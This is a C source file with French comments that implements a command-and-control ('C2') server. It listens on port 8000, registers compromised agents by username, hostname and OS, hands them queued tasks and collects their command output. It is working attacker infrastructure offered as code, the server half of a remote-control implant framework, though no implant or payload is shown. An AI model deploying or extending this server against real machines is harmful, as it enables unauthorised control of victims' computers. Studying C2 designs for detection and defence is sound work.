#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <json-c/json.h>
#include "mongoose.h"
#include "agent.h"
#include "task.h"
#include "cli.h"

// Gestionnaire d'événements HTTP
static void event_handler(struct mg_connection *conn, int ev, void *ev_data) {
    if (ev == MG_EV_HTTP_MSG) {
        struct mg_http_message *hm = (struct mg_http_message *)ev_data;

        // Vérifier si l'URI est "/api" et la méthode est POST avec mg_strcmp
        if (mg_strcmp(hm->uri, mg_str("/api")) == 0 && mg_strcmp(hm->method, mg_str("POST")) == 0) {
            char body[8192] = {0};
            // Utiliser hm->body.buf au lieu de hm->body.p
            strncpy(body, hm->body.buf, hm->body.len > sizeof(body) - 1 ? sizeof(body) - 1 : hm->body.len);

            struct json_object *parsed_json = json_tokener_parse(body);
            if (!parsed_json) {
                mg_http_reply(conn, 400, "Content-Type: application/json\r\n", "{\"error\": \"Invalid JSON\"}");
                return;
            }

            // Gestion de DECLARE
            struct json_object *declare_obj;
            if (json_object_object_get_ex(parsed_json, "DECLARE", &declare_obj)) {
                const char *username = json_object_get_string(json_object_object_get(declare_obj, "username"));
                const char *hostname = json_object_get_string(json_object_object_get(declare_obj, "hostname"));
                const char *os = json_object_get_string(json_object_object_get(declare_obj, "os"));

                struct Agent *agent = add_agent(username, hostname, os);
                if (agent) {
                    char response[256];
                    snprintf(response, sizeof(response), "{\"OK\": {\"UID\": \"%s\"}}", agent->uid);
                    mg_http_reply(conn, 200, "Content-Type: application/json\r\n", response);
                } else {
                    mg_http_reply(conn, 500, "Content-Type: application/json\r\n", "{\"error\": \"Failed to add agent\"}");
                }
            }

            // Gestion de FETCH
            struct json_object *fetch_obj;
            if (json_object_object_get_ex(parsed_json, "FETCH", &fetch_obj)) {
                const char *agent_uid = json_object_get_string(fetch_obj);
                update_agent_last_seen(agent_uid);

                struct Task *task = find_task(agent_uid);
                if (task) {
                    char response[8192];
                    snprintf(response, sizeof(response), "{\"task_uid\": \"%s\", \"action\": %s}", task->task_uid, task->action);
                    mg_http_reply(conn, 200, "Content-Type: application/json\r\n", response);
                } else {
                    mg_http_reply(conn, 200, "Content-Type: application/json\r\n", "{\"error\": \"NotFound\"}");
                }
            }

            // Gestion de RESULT
            struct json_object *result_obj;
            if (json_object_object_get_ex(parsed_json, "RESULT", &result_obj)) {
                const char *agent_uid = json_object_get_string(json_object_object_get(result_obj, "agent_uid"));
                const char *task_uid = json_object_get_string(json_object_object_get(result_obj, "task_uid"));
                const char *output = json_object_get_string(json_object_object_get(result_obj, "output"));

                update_agent_last_seen(agent_uid);
                if (update_task_result(task_uid, output)) {
                    mg_http_reply(conn, 200, "Content-Type: application/json\r\n", "{\"status\": \"OK\"}");
                } else {
                    mg_http_reply(conn, 500, "Content-Type: application/json\r\n", "{\"error\": \"Failed to update task\"}");
                }
            }

            json_object_put(parsed_json);
        } else {
            mg_http_reply(conn, 404, "Content-Type: application/json\r\n", "{\"error\": \"Not Found\"}");
        }
    }
}

// Thread pour la CLI
void *cli_thread(void *arg) {
    run_cli();
    return NULL;
}

int main() {
    srand(time(NULL)); // Initialisation du générateur aléatoire

    struct mg_mgr mgr;
    mg_mgr_init(&mgr);

    // Démarrer le serveur HTTP
    mg_http_listen(&mgr, "http://0.0.0.0:8000", event_handler, NULL);
    printf("Serveur C2 démarré sur http://0.0.0.0:8000\n");

    // Démarrer la CLI dans un thread séparé
    pthread_t cli;
    if (pthread_create(&cli, NULL, cli_thread, NULL) != 0) {
        fprintf(stderr, "Erreur lors de la création du thread CLI\n");
        mg_mgr_free(&mgr);
        return 1;
    }
    pthread_detach(cli);

    // Boucle principale pour le serveur HTTP
    for (;;) {
        mg_mgr_poll(&mgr, 1000);
    }

    mg_mgr_free(&mgr);
    return 0;
}